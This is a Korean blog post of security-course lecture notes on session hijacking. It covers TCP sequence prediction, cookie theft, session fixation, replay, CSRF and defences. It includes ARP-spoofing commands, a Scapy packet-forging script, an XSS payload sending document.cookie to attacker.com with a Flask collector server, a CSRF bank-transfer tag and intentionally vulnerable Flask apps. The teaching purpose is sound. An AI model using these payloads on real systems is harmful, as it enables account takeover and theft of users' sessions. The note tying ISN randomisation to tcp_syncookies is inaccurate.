---
layout: post
title: "Phase 2-3: 세션 하이재킹 (Session Hijacking)"
date: 2024-12-30 09:00:02 +0900
categories: [general]
tags: [SK-Rookies, Lecture-Notes]
---

# Phase 2-3: 세션 하이재킹 (Session Hijacking)

## 학습 목표
- 세션의 개념과 세션 하이재킹의 원리 이해
- TCP Sequence Number 예측 공격 메커니즘 학습
- HTTP Cookie/Session Hijacking 기법 습득
- Session Fixation, Session Replay 공격 파악
- HTTPS의 보안 메커니즘과 한계점 이해
- 세션 하이재킹 탐지 및 방어 방법 습득

---

## 1. 세션 개요

### 1.1 세션(Session)의 정의

**세션**
- 두 엔드포인트 간의 논리적 연결
- 상태 유지 (Stateful Communication)
- 시작 ~ 종료까지의 일련의 교환

**계층별 세션**
```
L4 (Transport):
  - TCP Connection
  - 4-Tuple로 식별: (Src IP, Src Port, Dst IP, Dst Port)
  
L7 (Application):
  - HTTP Session
  - Session ID/Cookie로 식별
  - 로그인 유지, 장바구니 등
```

### 1.2 Session Hijacking의 정의

**세션 하이재킹**
- 정당한 사용자의 세션을 탈취
- 인증 우회 (이미 인증된 세션 사용)
- 사용자 권한으로 행동

**목표**
```
1. 인증 우회
   - 로그인 없이 계정 접근

2. 권한 탈취
   - 관리자 세션 획득 → 시스템 제어

3. 정보 탈취
   - 개인정보, 금융정보 접근
```

---

## 2. TCP Session Hijacking

### 2.1 TCP 세션 구조

**TCP Connection 식별자**
```
4-Tuple:
  - Source IP: 192.168.1.10
  - Source Port: 50234
  - Destination IP: 8.8.8.8
  - Destination Port: 80

이 4개 조합으로 연결을 고유하게 식별
```

**TCP 상태**
```
Client                          Server
  |                               |
  | SYN (SEQ=100)                 |
  |------------------------------>|
  |                               | SYN_RECEIVED
  |                               |
  | SYN+ACK (SEQ=300, ACK=101)    |
  |<------------------------------|
  | SYN_SENT                      |
  |                               |
  | ACK (SEQ=101, ACK=301)        |
  |------------------------------>|
  | ESTABLISHED                   | ESTABLISHED
  |                               |
  | Data (SEQ=101, ACK=301)       |
  |------------------------------>|
  |                               |
  | ACK (SEQ=301, ACK=150)        |
  |<------------------------------|
  |                               |
```

**핵심: Sequence Number (SEQ)와 Acknowledgment Number (ACK)**
```
SEQ:
  - 전송하는 데이터의 시작 바이트 번호
  - 초기값(ISN): 랜덤 (보안)

ACK:
  - 다음에 받기를 기대하는 바이트 번호
  - "SEQ 100까지 받았으니 101부터 보내"
```

### 2.2 TCP Hijacking 원리

**공격 시나리오**
```
정상 통신:
Client (192.168.1.10:50234) ↔ Server (8.8.8.8:80)

SEQ 상태:
Client → Server: SEQ=1000, ACK=5000
Server → Client: SEQ=5000, ACK=1050

Attacker의 목표:
1. Client의 다음 SEQ 예측 (1050)
2. Server의 다음 SEQ 예측 (5000)
3. 위조 패킷 삽입

공격:
Attacker → Server:
  Src IP: 192.168.1.10 (위조)
  Src Port: 50234
  SEQ: 1050 (예측!)
  ACK: 5000
  Data: "rm -rf /"

Server:
  - SEQ가 맞으면 수락
  - 명령 실행
  - Client에 응답 전송

Client:
  - 예상치 못한 ACK 수신
  - RST 전송 또는 Desync
```

### 2.3 SEQ Number 예측

**예측 가능성**
```
과거 (BSD 계열):
  ISN = Time-based
  예: 매 초마다 128,000씩 증가
  → 예측 가능!

현재 (RFC 6528):
  ISN = Cryptographic Random
  → 예측 불가능
```

**비맹목 공격 (Non-Blind)**
```
전제: 같은 네트워크 (Sniffing 가능)

1. ARP Spoofing으로 MITM
2. Sniffing으로 실시간 SEQ/ACK 확인
3. 정확한 SEQ로 패킷 삽입
```

**맹목 공격 (Blind)**
```
전제: 원격, Sniffing 불가

고전적 방법 (Mitnick Attack, 1995):
1. Trusted Host 무력화 (SYN Flooding)
2. ISN 예측 (Time-based 시절)
3. Trusted IP로 위조 패킷 전송

현대:
  - ISN 랜덤화로 거의 불가능
  - 브루트포스 필요 (2^32 = 42억 가능성)
```

### 2.4 TCP Hijacking 도구

**Hunt (Linux)**
```bash
# 설치
sudo apt install hunt

# 실행
sudo hunt

# 메뉴:
l - List connections
a - ARP Spoofing
s - Sniff connection
r - Reset connection
i - Inject data
```

**Shijack**
```bash
# TCP Connection Hijacking
sudo shijack eth0 192.168.1.10 192.168.1.100 22

# 옵션:
# -s: Source IP
# -d: Destination IP
# -p: Port
```

**Scapy (수동 제작)**
```python
from scapy.all import *

# 스니핑으로 SEQ/ACK 확인 후
client_ip = "192.168.1.10"
server_ip = "8.8.8.8"
client_port = 50234
server_port = 80

# 예측된 SEQ/ACK
seq = 1050
ack = 5000

# 위조 패킷
ip = IP(src=client_ip, dst=server_ip)
tcp = TCP(sport=client_port, dport=server_port, flags="PA", seq=seq, ack=ack)
payload = "GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"

packet = ip/tcp/payload
send(packet)
```

### 2.5 TCP Hijacking 방어

**1. ISN 랜덤화**
```
Linux (기본 활성화):
  /proc/sys/net/ipv4/tcp_syncookies
  
→ 예측 불가능한 ISN 생성
```

**2. 암호화 (TLS/SSL)**
```
TCP Hijacking 성공해도:
- 페이로드 암호화됨
- 삽입 데이터를 암호화할 수 없음
- 서버가 복호화 실패 → 거부

→ 가장 효과적 방어
```

**3. IPsec**
```
- IP 레벨 암호화 + 인증
- ESP (Encapsulating Security Payload)
- 패킷 위조 불가
```

**4. Timeout**
```
- Idle Timeout 설정
- 비활성 연결 자동 종료
```

---

## 3. HTTP Session Hijacking

### 3.1 HTTP Session 메커니즘

**HTTP의 한계**
```
Stateless Protocol:
  - 각 요청은 독립적
  - 이전 요청을 기억 안 함

문제:
  - 로그인 → 다음 요청 시 다시 로그인?
  - 장바구니 → 페이지 이동 시 사라짐?
```

**해결: Session & Cookie**
```
Session (서버 측):
  - 서버가 사용자 상태 저장
  - Session ID로 식별
  - 메모리 또는 DB에 저장

Cookie (클라이언트 측):
  - Session ID를 클라이언트에 저장
  - 매 요청마다 전송
  - 서버가 Session 찾음
```

**동작 과정**
```
1. 로그인:
Client → Server: POST /login
  username=alice&password=secret

Server:
  - 인증 성공
  - Session 생성: {user: "alice", role: "admin"}
  - Session ID 생성: "abc123def456"
  - Session 저장: sessions["abc123def456"] = {user: "alice"}

Server → Client:
  Set-Cookie: SESSIONID=abc123def456; Path=/; HttpOnly

2. 이후 요청:
Client → Server: GET /profile
  Cookie: SESSIONID=abc123def456

Server:
  - Session ID 확인: "abc123def456"
  - Session 조회: {user: "alice", role: "admin"}
  - alice의 프로필 반환
```

### 3.2 Cookie Hijacking

**공격 원리**
```
목표: 피해자의 Cookie 탈취

방법:
1. Sniffing (HTTP, 평문)
2. XSS (Cross-Site Scripting)
3. MITM (ARP Spoofing)
4. Malware
5. Session Fixation
```

#### 방법 1: Sniffing (HTTP)

**시나리오**
```
환경: 공용 WiFi (Starbucks)

1. 공격자가 ARP Spoofing
2. 피해자가 HTTP 로그인
3. 공격자가 Cookie 스니핑

Wireshark Filter:
http.cookie

캡처된 패킷:
GET /profile HTTP/1.1
Host: vulnerable-site.com
Cookie: SESSIONID=abc123def456

4. 공격자가 Cookie 사용:
curl -H "Cookie: SESSIONID=abc123def456" http://vulnerable-site.com/profile

→ 피해자 계정으로 로그인됨!
```

**실습**
```bash
# 1. ARP Spoofing
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# 2. Wireshark 필터
http.cookie

# 3. Cookie 복사
# 4. 브라우저 개발자 도구 (F12)
#    Application → Cookies → 해당 도메인
#    Name: SESSIONID
#    Value: abc123def456

# 5. 페이지 새로고침 → 로그인됨
```

#### 방법 2: XSS (Cross-Site Scripting)

**원리**
```
취약점: 사용자 입력을 필터링 없이 출력

공격:
1. 댓글에 악성 스크립트 삽입:
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

2. 피해자가 페이지 방문
3. 스크립트 실행 → Cookie 전송
4. 공격자 서버에 Cookie 저장

공격자 서버 (Flask):
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('c')
    with open('cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return 'OK'

app.run(host='0.0.0.0', port=80)
```

**방어: HttpOnly 플래그**
```
Set-Cookie: SESSIONID=abc123; HttpOnly

→ JavaScript로 접근 불가
→ document.cookie에 안 보임
→ XSS로 탈취 불가
```

#### 방법 3: Session Fixation

**원리**
```
공격자가 Session ID를 미리 지정

일반적 Session:
1. 로그인 → 서버가 Session ID 생성
2. Cookie 전송

Session Fixation:
1. 공격자가 피해자에게 Session ID 전달
   http://vulnerable-site.com/?SESSIONID=attacker123
2. 피해자가 해당 링크로 로그인
3. 서버가 Session ID를 그대로 사용
4. 공격자가 같은 Session ID 사용 → 로그인됨
```

**공격 예시**
```
1. 공격자가 Session ID 획득:
curl http://vulnerable-site.com/
Set-Cookie: SESSIONID=xyz789

2. 피해자에게 피싱 메일:
"로그인하세요: http://vulnerable-site.com/?SESSIONID=xyz789"

3. 피해자 클릭 + 로그인

4. 공격자 접속:
curl -H "Cookie: SESSIONID=xyz789" http://vulnerable-site.com/profile
→ 피해자 계정!
```

**방어**
```
로그인 시 Session ID 재생성:

Before Login:
SESSIONID=temp123 (임시)

After Login:
session_regenerate_id()
→ SESSIONID=new456 (새 ID)

→ 공격자의 구 ID는 무효화
```

### 3.3 HTTPS의 보호

**HTTPS = HTTP + TLS**
```
암호화:
  - Cookie도 암호화됨
  - Sniffing해도 읽을 수 없음

장점:
  - MITM 공격 방어
  - Cookie 탈취 방어

한계:
  - XSS는 여전히 가능 (브라우저 내부에서 실행)
  - HttpOnly 플래그 필요
```

**Secure 플래그**
```
Set-Cookie: SESSIONID=abc123; Secure; HttpOnly

Secure:
  - HTTPS에서만 전송
  - HTTP로 다운그레이드되어도 Cookie 전송 안 함

→ SSL Stripping 공격 완화
```

### 3.4 Cookie Hijacking 도구

**Cookies.txt 추출 (Browser Extension)**
```
Chrome: EditThisCookie
Firefox: Cookie Editor

→ 쿠키 내보내기/가져오기
```

**Firesheep (역사적)**
```
- 2010년 공개
- 공용 WiFi에서 Cookie 자동 탈취
- 클릭 한 번에 계정 접근

→ HTTPS 전환 촉진에 기여
→ 현재는 대부분 사이트가 HTTPS
```

**Wireshark**
```
Display Filter:
http.cookie or http.set_cookie

Follow HTTP Stream:
- 우클릭 → Follow → HTTP Stream
- Cookie 포함 전체 세션 확인
```

### 3.5 Session Hijacking 실습

**시나리오: HTTP Session 탈취**

**1. 취약한 웹 서버 (Flask)**
```python
# vulnerable_app.py
from flask import Flask, request, make_response, session
import secrets

app = Flask(__name__)
app.secret_key = 'weak_secret'

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == 'admin' and password == 'admin123':
        session['username'] = username
        session['role'] = 'admin'
        return 'Login Success!'
    return 'Login Failed', 401

@app.route('/profile')
def profile():
    if 'username' in session:
        return f"Hello {session['username']}, Role: {session['role']}"
    return 'Not logged in', 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

**2. 공격자 (ARP Spoofing + Sniffing)**
```bash
# ARP Spoofing
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# 또는
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Wireshark 캡처
# Filter: http.request or http.response
```

**3. 피해자 (로그인)**
```bash
# HTTP POST (평문!)
curl -X POST http://192.168.1.100:5000/login \
  -d "username=admin&password=admin123" \
  -c cookies.txt

# 프로필 접근
curl -b cookies.txt http://192.168.1.100:5000/profile
```

**4. 공격자 (Cookie 사용)**
```bash
# Wireshark에서 캡처한 Cookie:
# Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...

# Cookie 사용
curl -H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0..." \
  http://192.168.1.100:5000/profile

# 결과: Hello admin, Role: admin
# → 하이재킹 성공!
```

---

## 4. Session Replay Attack

### 4.1 원리

**Replay Attack**
- 이전에 캡처한 유효한 데이터를 재전송
- 인증 우회

**시나리오**
```
정상 인증:
Client → Server: {username: "admin", timestamp: 1234567890}
Server: OK, token=abc123

공격:
Attacker → Server: {username: "admin", timestamp: 1234567890}
                   (똑같은 데이터 재전송)
Server: OK, token=abc123 (다시 인증됨!)
```

### 4.2 방어

**1. Nonce (Number used Once)**
```
요청마다 고유한 일회용 번호:

Client → Server: {username: "admin", nonce: random()}
Server: nonce 저장

재전송 시:
Attacker → Server: {username: "admin", nonce: used_nonce}
Server: Nonce 이미 사용됨 → 거부
```

**2. Timestamp**
```
요청에 시간 포함:

Client → Server: {username: "admin", timestamp: now()}
Server: 
  if (now() - timestamp) > 5분:
      거부

→ 5분 이상 지난 요청 무효
```

**3. Sequence Number**
```
TCP처럼 순서 번호:

Client → Server: {username: "admin", seq: 1}
Client → Server: {username: "admin", seq: 2}

Attacker → Server: {username: "admin", seq: 1}
Server: seq가 과거 → 거부
```

**4. Challenge-Response**
```
1. Client → Server: 인증 요청
2. Server → Client: Challenge (랜덤 값)
3. Client → Server: Response (Challenge 처리 결과)
4. Server: Response 검증

→ Replay 불가 (Challenge가 매번 다름)
```

---

## 5. 고급 Session Hijacking

### 5.1 Sidejacking

**정의**
- WiFi에서 Cookie 탈취
- Firesheep 방식

**특징**
- 비암호화 WiFi (WEP, Open)
- HTTP 트래픽 스니핑
- 자동화 도구

### 5.2 Cross-Site Request Forgery (CSRF)

**개념**
- 사용자가 의도하지 않은 요청 전송
- 세션이 유지된 상태에서 악용

**예시**
```html
<!-- 공격자 웹사이트 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

피해자가 페이지 방문:
1. 브라우저가 <img> 로드 시도
2. bank.com에 GET 요청
3. 피해자의 Cookie 자동 전송 (Same-Site)
4. 서버가 인증된 요청으로 인식
5. 송금 실행!
```

**방어: CSRF Token**
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_value">
  <input name="to" value="alice">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>

서버:
  - 폼 생성 시 random CSRF Token 발급
  - Session에 저장
  - 폼 제출 시 Token 검증
  - 일치하지 않으면 거부

→ 공격자는 Token을 알 수 없음
```

### 5.3 Man-in-the-Browser (MitB)

**정의**
- 브라우저 내부에서 데이터 조작
- 악성코드 (Trojan, Browser Extension)

**동작**
```
정상:
User → Browser → HTTPS → Server

MitB:
User → Browser (악성코드 감염)
         ↓
      데이터 변조
         ↓
      HTTPS → Server

예:
사용자 입력: 송금 $100 → Alice
악성코드 변조: 송금 $1000 → Attacker
```

**특징**
- HTTPS 무력화 (암호화 전에 탈취)
- 2FA 우회 가능
- Zeus, SpyEye 등 뱅킹 트로이목마

**방어**
- 안티바이러스
- 브라우저 업데이트
- Extension 최소화
- Out-of-Band 인증 (SMS, 앱)

---

## 6. 탐지 방법

### 6.1 서버 측 탐지

**1. IP 주소 변경**
```python
# Session에 IP 저장
session['ip'] = request.remote_addr

# 요청마다 확인
if session.get('ip') != request.remote_addr:
    log_alert('Session IP changed!')
    # 선택: 로그아웃 또는 재인증 요구
```

**2. User-Agent 변경**
```python
session['user_agent'] = request.headers.get('User-Agent')

if session.get('user_agent') != request.headers.get('User-Agent'):
    log_alert('User-Agent changed!')
```

**3. 동시 접속 탐지**
```python
# Session에 마지막 활동 시간 저장
session['last_activity'] = time.time()

# 짧은 시간 내 다른 IP에서 접속
if (time.time() - session['last_activity']) < 1초:
    if session['ip'] != request.remote_addr:
        log_alert('Concurrent access from different IPs!')
```

**4. 비정상 행동 패턴**
```
- 평소와 다른 시간대 접속
- 평소와 다른 지역 (GeoIP)
- 비정상적 대량 요청
```

### 6.2 클라이언트 측 탐지

**1. 브라우저 알림**
```
"새로운 기기에서 로그인되었습니다"
- Email 알림
- SMS 알림
- 앱 푸시 알림
```

**2. 활성 세션 관리**
```
계정 설정 → 활성 세션:
- 현재 로그인된 모든 기기 표시
- IP, 위치, 브라우저, 마지막 활동 시간
- 개별 세션 로그아웃 기능
```

---

## 7. 방어 방법 종합

### 7.1 서버 측 방어

**1. HTTPS 강제**
```
HSTS (HTTP Strict Transport Security):

HTTP Header:
Strict-Transport-Security: max-age=31536000; includeSubDomains

→ 브라우저가 HTTP 요청을 자동으로 HTTPS로 변환
→ SSL Stripping 방어
```

**2. Secure & HttpOnly Cookie**
```python
# Flask
from flask import session
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

# Django
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
```

**3. Session Timeout**
```python
from datetime import timedelta

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

# 비활성 시간 초과
if (time.time() - session.get('last_activity', 0)) > 1800:
    session.clear()
    return redirect('/login')

session['last_activity'] = time.time()
```

**4. Session ID 재생성**
```python
# 로그인 시
old_session_id = session.sid
session.regenerate()
log(f"Session regenerated: {old_session_id} → {session.sid}")

# 권한 변경 시 (예: 일반 → 관리자)
session.regenerate()
```

**5. IP/User-Agent 바인딩**
```python
# 로그인 시
session['ip'] = request.remote_addr
session['user_agent'] = request.headers.get('User-Agent')

# 요청마다
if session['ip'] != request.remote_addr:
    # 선택 1: 경고 후 계속
    flash('Warning: IP changed')
    
    # 선택 2: 재인증 요구
    return redirect('/reauth')
    
    # 선택 3: 로그아웃
    session.clear()
    return redirect('/login')
```

### 7.2 클라이언트 측 방어

**1. VPN 사용**
```
공용 WiFi 사용 시:
- VPN 연결
- 트래픽 암호화
- Sniffing 방어
```

**2. HTTPS 확인**
```
- 주소창 자물쇠 확인
- https:// 확인
- 인증서 검증
- 피싱 사이트 주의
```

**3. 로그아웃**
```
- 사용 후 반드시 로그아웃
- 특히 공용 PC
```

**4. 브라우저 보안**
```
- 최신 버전 유지
- 의심스러운 Extension 제거
- Private Browsing (공용 PC)
```

---

## 8. 실습 과제

### 과제 1: HTTP Cookie Sniffing
```bash
# 환경: 2개 VM (Ubuntu)
# VM1: 웹 서버 (Flask)
# VM2: 클라이언트

# VM1: 서버 실행
python3 vulnerable_app.py

# VM2: 로그인
curl -X POST http://VM1:5000/login \
  -d "username=admin&password=admin123" \
  -c cookies.txt

# VM3 (Kali): 중간자 공격
sudo ettercap -T -M arp:remote /VM1// /VM2//

# Wireshark 캡처
# Filter: http.cookie

# 캡처한 Cookie 사용
curl -b "session=captured_value" http://VM1:5000/profile
```

### 과제 2: Session Fixation 테스트
```python
# vulnerable_server.py
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'weak'

@app.route('/login', methods=['POST'])
def login():
    # 취약점: Session ID 재생성 안 함
    username = request.form['username']
    session['username'] = username
    return 'Logged in!'

# 공격:
# 1. http://server/?session=attacker_session
# 2. 피해자 로그인
# 3. 공격자가 같은 session 사용
```

### 과제 3: HTTPS vs HTTP 비교
```bash
# HTTP (취약)
curl -v http://httpbin.org/cookies/set?session=abc123

# HTTPS (안전)
curl -v https://httpbin.org/cookies/set?session=abc123

# Wireshark에서 비교:
# HTTP: Cookie 평문
# HTTPS: 암호화됨
```

---

## 9. 연결 포인트

### Phase 1.1: Network Architecture
→ **TCP SEQ/ACK**: Session Hijacking의 핵심
→ **3-Way Handshake**: ISN 생성

### Phase 1.3: Information Security
→ **TLS/SSL**: HTTPS로 Cookie 보호
→ **암호화**: Session 데이터 보호

### Phase 2.1: Scanning/Sniffing
→ **Sniffing**: Cookie 탈취 방법
→ **Wireshark**: 세션 분석

### Phase 2.2: Spoofing
→ **ARP Spoofing**: MITM으로 Cookie 스니핑
→ **IP Spoofing**: TCP Hijacking

### Phase 3.1: Firewall
→ **Stateful Inspection**: TCP 세션 추적
→ **비정상 SEQ 탐지**

### Phase 3.2: IDS/IPS
→ **Session Anomaly**: IP/User-Agent 변경 탐지
→ **Concurrent Connection**: 동시 접속

---

## 10. 핵심 요약

**TCP Session Hijacking**
- 원리: SEQ/ACK 예측 또는 Sniffing
- 방어: ISN 랜덤화, TLS, IPsec

**HTTP Session Hijacking**
- 원리: Cookie 탈취 (Sniffing, XSS, MITM)
- 방어: HTTPS, Secure/HttpOnly, HSTS

**Session Fixation**
- 원리: Session ID 미리 지정
- 방어: 로그인 시 Session ID 재생성

**Session Replay**
- 원리: 캡처한 데이터 재전송
- 방어: Nonce, Timestamp, Challenge-Response

**종합 방어**
- HTTPS 강제 (HSTS)
- Secure + HttpOnly + SameSite Cookie
- Session Timeout
- IP/User-Agent 바인딩
- 2FA (Two-Factor Authentication)

---

**다음 학습**: Phase 2-4 DoS/DDoS Attacks
